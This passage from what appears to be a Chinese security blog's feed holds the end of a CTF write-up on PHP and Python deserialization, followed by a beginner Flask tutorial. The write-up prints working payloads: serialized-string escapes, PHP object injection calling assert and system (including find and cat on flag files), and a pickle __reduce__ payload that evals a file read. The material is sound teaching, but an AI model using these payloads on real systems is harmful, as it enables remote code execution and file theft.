&#39;where&#39;</code>其中之一就替换成<code>&#39;hacker&#39;</code>，<code>hacker</code>长度为6位，试想如果替换了里面长度小于6位的字符串，而s后的取值长度发值有没变，那么就会有末尾的字符溢出不会被读取到，而没被读取到的话自然就被当做序列化后的格式处理，再结合这里，改闭合的大括号就可以闭合的上，再看看我们需要逃逸的字符串<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>，就是这34位，而替换的字符串中正好一个有比<code>hacker</code>短的字符串<code>where</code>，那么一次就可以逃逸一个出来，那么直接传入34个<code>where</code>就可以将<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>完整的逃逸出来，于是最终<code>payload</code>如下：</p><pre class="language-php" data-language="php"><code class="language-php">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:9:&quot;aa@aa.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:34:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;0cc175b9c0f1b6a831c399e269772661&quot;;&#125;</code></pre><p>令<code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>即可</p><p>随后发包：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412212311132.png" alt loading="lazy"></p><p>查看<code>profile.php</code>网页页面源代码，将图片的base64解可得到<code>config.php</code>的内容，即可得到flag</p><h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="NPUCTF2020-ReadlezPHP"></a>NPUCTF2020-ReadlezPHP</h3><p>F12后点进去可以看到源码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200422183658606.png" alt loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php#error_reporting(0);class HelloPhp&#123;    public $a;    public $b;    public function __construct()&#123;        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;        $this-&gt;b &#x3D; &quot;date&quot;;    &#125;    public function __destruct()&#123;        $a &#x3D; $this-&gt;a;        $b &#x3D; $this-&gt;b;        echo $b($a);    &#125;&#125;$c &#x3D; new HelloPhp;if(isset($_GET[&#39;source&#39;]))&#123;    highlight_file(__FILE__);    die(0);&#125;@$ppp &#x3D; unserialize($_GET[&quot;data&quot;]);2020-04-22 10:14:24</code></pre><p>简单的反序列化</p><p><code>__destruct</code>方法在反序列化的时候触发，里面的<code>$b($a)</code>即作为代码执行的条件，于是可以构造<code>assert(phpinfo())</code>，<code>payload</code>如下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass HelloPhp&#123;    public $a &#x3D; &#39;phpinfo()&#39;;    public $b &#x3D; &quot;assert&quot;;&#125;$c &#x3D; new HelloPhp();echo serialize($c);</code></pre><p>将结果传入<code>data</code>搜索flag即可得到flag</p><h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="安洵杯-2019-easy_serialize_php"></a>安洵杯-2019-easy_serialize_php</h3><p>题目给出了源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$function &#x3D; @$_GET[&#39;f&#39;];function filter($img)&#123;    $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);    $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;    return preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123;    unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;$_SESSION[&#39;function&#39;] &#x3D; $function;extract($_POST);if(!$function)&#123;    echo &#39;&lt;a href&#x3D;&quot;..&#x2F;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123;    $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;    $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info &#x3D; filter(serialize($_SESSION));if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;    highlight_file(&#39;index.php&#39;);&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;    eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;    $userinfo &#x3D; unserialize($serialize_info);    echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));&#125;</code></pre><p>在令<code>$function == &#39;phpinfo&#39;</code>时查看<code>phpinfo()</code>内容发现存在<code>d0g3_f1ag.php</code> 文件，推测flag在其中，于是想办法构造文件读取方法</p><p>不难看到代码中有一个<code>extract()</code>函数，这个函数如果没设置<code>extract_rules</code>为<code>EXTR_SKIP</code> 则会覆盖原有变量</p><ul><li><strong>extract()</strong>： 函数从数组中将变量导入到当前的符号表。<a href="https://www.php.net/manual/zh/function.extract.php">参考</a></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200515135141013.png" alt loading="lazy"></p><p>那么我们如果想要读取<code>d0g3_f1ag.php</code>文件的内容就需要令反序列化后的<code>$_SESSION[&#39;img&#39;]</code>为<code>d0g3_f1ag.php  =&gt;  ZDBnM19mMWFnLnBocA==</code>则初步反序列化内容<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>再看到<code>$serialize_info = filter(serialize($_SESSION));</code>，先经过序列化，然后在进行<code>filter</code>函数，也就是过滤替换操作，这样的话就很有可能会造成序列化字符串逃逸的问题，于是构造利用payload：</p><pre class="language-php" data-language="php"><code class="language-php">_SESSION[user]&#x3D;flagflagflagflagphpphp&amp;_SESSION[function]&#x3D;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;s:1:&quot;f&quot;;s:1:&quot;a&quot;;&#125;</code></pre><p>由于<code>_SESSION</code>数组有3个值，则需要在后面补充随便一个值即可</p><p>传入后<code>$serialize_info</code>的就为以下值</p><pre class="language-php" data-language="php"><code class="language-php">a:3:&#123;s:4:&quot;user&quot;;s:22:&quot;&quot;;s:8:&quot;function&quot;;s:34:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA&#x3D;&#x3D;&quot;;&#125; &quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw&#x3D;&#x3D;&quot;;&#125;</code></pre><p><code>user</code>闭合<code>&quot;;s:8:&quot;function&quot;;s:34:</code>，随后再读取<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>，随后大括号闭合，后面的<code>&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code>值丢弃</p><p>读取到<code>d0g3_f1ag.php</code> 内容为</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$flag &#x3D; &#39;flag in &#x2F;d0g3_fllllllag&#39;;?&gt;</code></pre><p>再依法读取<code>/d0g3_fllllllag</code>即可</p><pre class="language-php" data-language="php"><code class="language-php">_SESSION[user]&#x3D;flagflagflagflagphpphp&amp;_SESSION[function]&#x3D;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:1:&quot;f&quot;;s:1:&quot;a&quot;;&#125;</code></pre><h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>题目每隔一段时间都会自动发一个包刷新一下网页，抓包下来看看发来了啥数据</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625154555825.png" alt loading="lazy"></p><p>测试后报错得到函数调用了<code>call_user_func()</code>函数，该函数把第一个参数作为回调函数调用，也就是说这个数据包调用了date函数，传入了后面为p的参数，并且执行了函数输出了结果</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155114637.png" alt loading="lazy"></p><p>于是用<code>system</code>函数测试命令执行</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155200767.png" alt loading="lazy"></p><p>被过滤了，于是直接将<code>index.php</code>的源码读取出来(读根目录没有flag)，<code>func=readfile&amp;p=index.php</code>，得到源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);function gettime($func, $p) &#123;    $result &#x3D; call_user_func($func, $p);    $a&#x3D; gettype($result);    if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;        return $result;    &#125; else &#123;return &quot;&quot;;&#125;&#125;class Test &#123;    var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;    var $func &#x3D; &quot;date&quot;;    function __destruct() &#123;        if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;            echo gettime($this-&gt;func, $this-&gt;p);        &#125;    &#125;&#125;$func &#x3D; $_REQUEST[&quot;func&quot;];$p &#x3D; $_REQUEST[&quot;p&quot;];if ($func !&#x3D; null) &#123;    $func &#x3D; strtolower($func);    if (!in_array($func,$disable_fun)) &#123;        echo gettime($func, $p);    &#125;else &#123;        die(&quot;Hacker...&quot;);    &#125;&#125;?&gt;</code></pre><p>果不其然过滤了很多命令执行的函数，用的<code>in_array</code>函数进行对比，但是可以看到改函数的<code>Test</code>方法，里面也调用了<code>gettime</code>方法，于是构造反序列化利用</p><p>exp：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass Test &#123;    public $p &#x3D; &quot;find &#x2F; -name *flag*&quot;;    public $func &#x3D; &quot;system&quot;;&#125;$b &#x3D; new Test();echo serialize($b);O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:19:&quot;find &#x2F; -name *flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><p>传入找到flag所在的文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155712200.png" alt loading="lazy"></p><p>尝试读取</p><pre class="language-php" data-language="php"><code class="language-php">func&#x3D;unserialize&amp;p&#x3D;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat &#x2F;tmp&#x2F;flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></pre><p>得到flag</p><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="CISCN2019-华北赛区-Day1-Web2—ikun"><a href="#CISCN2019-华北赛区-Day1-Web2—ikun" class="headerlink" title="CISCN2019-华北赛区-Day1-Web2—ikun"></a>CISCN2019-华北赛区-Day1-Web2—ikun</h3><p>根据题目提示需要买到lv6的账号，于是写脚本找</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;4882ba34-0c83-48c1-b876-e1b21efa6a68.node3.buuoj.cn&#x2F;shop?page&#x3D;&#123;&#125;&quot;for i in range(1000):    a &#x3D; requests.get(url.format(i))    if &quot;static&#x2F;img&#x2F;lv&#x2F;lv6.png&quot; in a.text:        print(url.format(i))</code></pre><p>跑出lv6在<code>page=181</code>的页面，点击购买钱不够，发现有折扣，于是抓包改折扣为0.0000001，随后提示需要是<code>admin</code>，抓包注意到有一个<code>jwt</code>的<code>cookie</code>，<a href="https://www.jianshu.com/p/576dbf44b2ae">参考</a>，这里有一个编解码<a href="https://jwt.io/#debugger-io">网站</a>，再找到爆破密钥脚本<a href="https://github.com/brendan-rius/c-jwt-cracker">网站</a>，跑出来密钥为<code>1kun</code>，放到编码网站编码后携带这个<code>jwt</code>的<code>cookie</code>发包，随后来到<code>b1g_m4mber</code>界面，查看源码得到<code>www.zip</code>源码包，找到关键利用的代码</p><pre class="language-python" data-language="python"><code class="language-python">import tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler):    @tornado.web.authenticated    def get(self, *args, **kwargs):        if self.current_user &#x3D;&#x3D; &quot;admin&quot;:            return self.render(&#39;form.html&#39;, res&#x3D;&#39;This is Black Technology!&#39;, member&#x3D;0)        else:            return self.render(&#39;no_ass.html&#39;)    @tornado.web.authenticated    def post(self, *args, **kwargs):        try:            become &#x3D; self.get_argument(&#39;become&#39;)            p &#x3D; pickle.loads(urllib.unquote(become))            return self.render(&#39;form.html&#39;, res&#x3D;p, member&#x3D;1)        except:            return self.render(&#39;form.html&#39;, res&#x3D;&#39;This is Black Technology!&#39;, member&#x3D;0)</code></pre><p>明显的pickle反序列化利用，POST的<code>become</code>为利用点，随后构造反序列化利用poc：</p><pre class="language-python" data-language="python"><code class="language-python"># -*- coding: UTF-8 -*-# 题目是在python2环境下，需要用python2跑import pickleimport urllibclass dairy(object):    def __reduce__(self):        return eval, (&quot;open(&#39;&#x2F;flag.txt&#39;,&#39;r&#39;).read()&quot;,) &#x2F;&#x2F; eval直接读取文件today &#x3D; dairy()# print(pickle.dumps(today))x &#x3D; pickle.dumps(today)print(urllib.quote(x))a &#x3D; pickle.loads(urllib.unquote(x))</code></pre><p>得到payload：</p><pre class="language-python" data-language="python"><code class="language-python">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</code></pre><p>传入发包得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;PHP&quot;&gt;&lt;a href=&quot;#PHP&quot; class=&quot;headerlink&quot; title=&quot;PHP&quot;&gt;&lt;/a&gt;PHP&lt;/h2&gt;&lt;p&gt;php中常用的几种魔术方法和触发条件&lt;/p&gt;
&lt;pre class=&quot;language-php&quot; data-language=&quot;php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;__construct ：当一个对象创建时被调用
__destruct ：当一个对象销毁时被调用
__toString ：当一个类或对象被当作一个字符串被调用
__wakeup ：当一个对象使用 unserialize 时触发，反序列化时触发
__sleep ：当一个对象使用 serialize 时触发，序列化时触发
__get ：当一个对象读取不可访问属性的值时触发
__set ：当一个对象在给不可访问属性赋值时
__isset ：当一个对象当对不可访问属性调用 isset 或 empty 时触发
__unset ：当一个对象对不可访问属性调用 unset 时触发
__invoke ：当一个对象尝试以调用函数的方式调用一个对象时触发
__set_state ：当一个对象调用 var_export 导出类时，此静态方法会被调用
__call ：当一个对象在对象上下文中调用不可访问的方法时触发 
__callStatic ：当一个对象在静态上下文中调用不可访问的方法时触发&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;不同属性之间的区别&lt;/p&gt;
&lt;pre class=&quot;language-php&quot; data-language=&quot;php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;public  变量（公有） 
直接将变量名反序列化出来 
protected  变量（受保护） 
\x00 + * + \x00 + 变量名 
private  变量（私有） 
\x00 + 类名 + \x00 + 变量名&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="反序列化" scheme="https://www.extrader.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>初识Flask</title>
    <link href="https://www.extrader.top/posts/ebf6eea3/"/>
    <id>https://www.extrader.top/posts/ebf6eea3/</id>
    <published>2020-03-27T16:00:00.000Z</published>
    <updated>2020-03-27T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%88%9D%E8%AF%86Flask/flask-icon.png" alt loading="lazy"></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Flask是一个用Python编写的Web应用程序框架。 它由 <strong>Armin Ronacher</strong> 开发，他领导一个名为Pocco的国际Python爱好者团队。 Flask基于Werkzeug WSGI工具包和<a href="http://docs.jinkan.org/docs/jinja2/">Jinja2</a>模板引擎。两者都是Pocco项目。</p><p><a href="https://dormousehole.readthedocs.io/en/latest/">Flask中文文档</a></p><a id="more"></a><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Python2.7及以上，Python3.4及以上，我这里用的Python2.7</p><p><strong>安装virtualenv</strong></p><p>virtualenv可以创建一个独立的python运行环境，这个环境和系统的python环境是互不干扰的，也就是说你在这个环境中安装的python包不会安装到系统的python环境中，系统python环境中的包会复制到这个环境中（但新版本的virtualenv并不会复制过来，默认只安装<code>setuptools</code>，<code>wheel</code>和<code>pip</code>）</p><p>当然如果不想用系统的包的话可以加一些参数：</p><p><code>–-no-site-packages</code>：表示在建立虚拟环境时不将原版本中的第三方库拷贝过来，这样就能获得一个纯净的Python环境。（可这个参数新版的virtualenv好像用不了，我的就是这样，但网上都这样讲，=.=）</p><p><code>--no-setuptools</code>：不安装setuptools；<code>--no-wheel</code>：不安装whell；<code>--no-pip</code>：不安装pip</p><p>安装virtualenv包：</p><pre class="language-shell" data-language="shell"><code class="language-shell">pip install virtualenv</code></pre><p>创建环境：</p><pre class="language-shell" data-language="shell"><code class="language-shell">mkdir Flask  #创建项目目录cd Flaskvirtualenv -p C:\Python2\python.exe E:\flask\venv  #在这个项目中创建一个独立的python环境，环境命名为venv，-p表示指定python的版本路径.\venv\Scripts\activate  #启动虚拟环境;deactivate可退出此环境</code></pre><p>接下来就要在这个虚拟环境中安装Flask了</p><pre class="language-shell" data-language="shell"><code class="language-shell">E:\flask\venv\Scripts\python.exe -m pip list  #可看到当前虚拟环境中的所有的python包，当然不加路径也可以pip install Flask</code></pre><p>至此虚拟环境就搭建成功了，当然如果你不想用虚拟的python环境用系统自带的也可以</p><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><pre class="language-python" data-language="python"><code class="language-python">from flask import Flask #导入Flask模块app &#x3D; Flask(__name__)#使用当前模块作为参数@app.route(&#39;&#x2F;&#39;)def hello_world():    return &#39;Hello World&#39;if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p><code>app.route(rule, options)</code>：该函数为<code>Flask</code>类的一个方法，告诉应用程序哪个URL应该调用相关的函数</p><ul><li><strong>rule</strong>：参数表示与该函数的URL绑定</li><li><strong>endpoint</strong>：被注册的url的名字，一般用来反向生成url的时候使用，默认把视图函数的名字作为endpoint，如:endpoint=”login”</li><li><strong>options</strong>：是要转发给基础Rule对象的参数列表。</li></ul><p>上面的<code>&#39;/&#39;</code>表示URL与hello_world函数绑定，在浏览器中打开web服务器的主页时，将呈现该函数的输出</p><p><code>app.run(host, port, debug, options)</code>：表示本地开发服务器上运行应用程序</p><ul><li><strong>host</strong>：要监听的主机名。 默认为127.0.0.1（localhost）。设置为“0.0.0.0”以使服务器在外部可用</li><li><strong>port</strong>：端口设置，默认值为5000</li><li><strong>debug</strong>：默认为false。 如果设置为true，则提供调试信息</li><li><strong>options</strong>：要转发到底层的Werkzeug服务器。</li></ul><p>浏览器访问<code>http://127.0.0.1:5000/</code>即可看到函数的输出</p><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><pre class="language-python" data-language="python"><code class="language-python">from flask import Flaskapp &#x3D; Flask(__name__)#@app.route(&#39;&#x2F;hello&#39;)  #添加路由def hello_world():    return &#39;Hello World&#39;app.add_url_rule(&#39;&#x2F;hello&#x2F;&#39;,&#39;hello&#39;,view_func&#x3D;hello_world)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p><code>app.add_url_rule(rule,endpoint,view_func,options)</code>：该方法与route类似</p><ul><li><strong>rule</strong>：一个字符串格式的url规则，如：”/login”</li><li><strong>endpoint</strong>：url规则的名字，用来反向生成url使用，默认是视图函数的名字。</li><li><strong>view_func</strong>：视图函数，当对应的endpoint名字被请求时需要调用的函数。</li><li><strong>options</strong>： 类似route时候的options，methods参数默认是只监听get</li></ul><h2 id="变量规则"><a href="#变量规则" class="headerlink" title="变量规则"></a>变量规则</h2><pre class="language-python" data-language="python"><code class="language-python">from flask import Flaskapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;hello&#x2F;&lt;name&gt;&#39;)def hello_world(name):    return &#39;Hello &#123; &#125;&#39;.format(name)if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    app.run(&#39;0.0.0.0&#39;,debug &#x3D; True)</code></pre><p>在浏览器输入<code>http://127.0.0.1:5000/hello/flask</code>则会显示<code>Hello flask</code></p><p>除了默认字符串变量部分之外，还可以使用以下转换器构建规则：</p><ul><li><strong>int</strong>：接受整数，不为整数则404，<code>@app.route(&#39;/hello/&lt;int:name&gt;&#39;)</code></li><li><strong>float</strong>：接受浮点数，不为浮点数则404，<code>@app.route(&#39;/hello/&lt;float:name&gt;&#39;)</code></li><li><strong>path</strong>：接受用作目录分隔符的斜杠，<code>@app.route(&#39;/hello/&lt;path:name&gt;&#39;)</code></li></ul><h2 id="URL构建"><a href="#URL构建" class="headerlink" title="URL构建"></a>URL构建</h2><pre class="language-python" data-language="python"><code class="language-python">from flask import Flask, redirect, url_forapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;name&#39;)def hello_admin():   return &#39;hello Admin&#39;@app.route(&#39;&#x2F;guest&#x2F;&lt;guest&gt;&#39;)def hello_guest(guest):   return &#39;Hello &#123; &#125; as Guest&#39;.format(guest)@app.route(&#39;&#x2F;user&#x2F;&lt;name&gt;&#39;)def hello_user(name):   if name &#x3D;&#x3D; &#39;admin&#39;:       return redirect(url_for(&#39;hello_admin&#39;))#redirect函数直接对route的路径进行访问，url_for直接对函数进行访问，一同使用则访问此路径下的函数   else:       return redirect(url_for(&#39;hello_guest&#39;,guest &#x3D; name))if __name__ &#x3D;&#x3D; &#39;__main__&#39;:   app.run(debug &#x3D; True)</code></pre><p><code>redirect(location, code=302, Response=None)</code>：该函数用来实现重定向功能</p><ul><li><strong>location</strong>：一个链接地址，可以使用url_for()函数得到，也可以是静态文件地址</li><li><strong>code</strong>：可以取值为301、302、303、305、307，默认302,300、304不可以</li><li><strong>Response</strong>：一个响应类，默认是werkzeug.wrappers.Response</li></ul><p>输入<code>http://127.0.0.1:5000/user/admin</code>则会302重定向到<code>http://127.0.0.1:5000/name</code>显示hello Admin</p><p><code>http://127.0.0.1:5000/user/flask</code>则会302重定向到<code>http://127.0.0.1:5000/guest/flask</code>，显示Hello flask as Guest</p><h2 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h2><p>首先创建一个HTML表单，使用POST方法将表单数据发送到URL，命名为login.html</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>http://localhost:5000/login<span class="token punctuation">"</span></span> <span class="token attr-name">method</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Enter Name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>nm<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation">=</span> <span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><pre class="language-python" data-language="python"><code class="language-python">from flask import Flask, redirect, url_for, requestapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;success&#x2F;&lt;name&gt;&#39;)def success(name):   return &#39;welcome &#123; &#125;&#39;.format(name)@app.route(&#39;&#x2F;login&#39;,methods &#x3D; [&#39;POST&#39;,&#39;GET&#39;])def login():   if request.method &#x3D;&#x3D; &#39;POST&#39;:       user &#x3D; request.form[&#39;nm&#39;]  #获取参数nm的值       return redirect(url_for(&#39;success&#39;,name &#x3D; user))   else:       user &#x3D; request.args.get(&#39;nm&#39;)       return redirect(url_for(&#39;success&#39;,name &#x3D; user))if __name__ &#x3D;&#x3D; &#39;__main__&#39;:   app.run(debug &#x3D; True)</code></pre><p><strong>Request</strong>对象</p><ul><li><strong>Form</strong>：是一个字典对象,包含表单参数及其值的键和值对。</li><li><strong>args</strong>：解析查询字符串的内容，是包含表单参数对及其对应值对的列表的字典对象</li><li><strong>Cookies</strong>：保存Cookie名称和值的字典对象。</li><li><strong>files</strong>：与上传文件有关的数据。</li><li><strong>method</strong>：当前请求方法。</li></ul><p>输入flask回车后先跳转到<code>http://127.0.0.1:5000/login</code>然后自动POST一个nm参数后302重定向到<code>http://127.0.0.1:5000/success/flask</code>输出welcome flask</p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><pre class="language-python" data-language="python"><code class="language-python">from flask import Flaskapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;&#39;)def index():   return &#39;&lt;h1&gt;Hello World&lt;&#x2F;h1&gt;&#39;if __name__ &#x3D;&#x3D; &#39;__main__&#39;:   app.run(debug &#x3D; True)</code></pre><p>访问网站会得到一个Hello World标题，但这样吧标签插入在python代码中就很麻烦，于是这里就引入了<strong>Jinja2</strong>模板引擎，可以通过<strong>render_template()</strong>函数呈现HTML文件。</p><p>新建一个templates文件夹，在其中建立一个hello.html文件：</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype">&lt;!doctype html></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Hello &#123; &#123;  marks &#125;&#125;!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></code></pre><pre class="language-python" data-language="python"><code class="language-python">from flask import Flask, render_templateapp &#x3D; Flask(__name__)@app.route(&#39;&#x2F;hello&#x2F;&#39;)@app.route(&#39;&#x2F;hello&#x2F;&lt;score&gt;&#39;)def hello_name(score&#x3D;None):   return render_template(&#39;hello.html&#39;,marks &#x3D; score)#自动寻找目录下的templates文件夹下的html文件if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    